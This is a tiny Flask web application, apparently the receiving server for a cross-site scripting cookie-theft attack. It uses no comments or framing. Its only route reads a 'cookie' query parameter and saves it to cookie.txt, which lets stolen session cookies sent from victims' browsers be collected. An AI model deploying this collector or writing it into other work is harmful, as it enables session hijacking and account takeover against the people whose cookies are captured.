from flask import Flask, request

app = Flask(__name__)


@app.route("/")
def main():
    cookie = request.args.get('cookie', '')
    with open('cookie.txt', 'w') as cookie_out:
        cookie_out.write(cookie)
    return ''
